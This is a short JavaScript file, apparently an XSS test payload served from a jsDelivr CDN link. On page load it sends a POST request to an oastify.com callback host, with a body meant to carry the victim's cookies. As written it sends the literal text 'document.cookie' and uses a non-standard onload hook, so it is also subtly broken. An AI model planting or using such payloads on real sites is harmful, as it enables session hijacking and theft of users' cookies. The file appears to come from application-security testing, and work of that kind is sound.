// this is a test for XSS exploit
// access link is : 
// https://cdn.jsdelivr.net/gh/user/repo@version/file
// https://cdn.jsdelivr.net/gh/IvanVernichenkoDevPro/AppSec@main/test.js

document.onload = (event) => { 
	fetch('https://66ao3lommh8o2llqdjzjbw3w4naeydm2.oastify.com',
	{
		method : "POST",
		body: "document.cookie"
	});
}
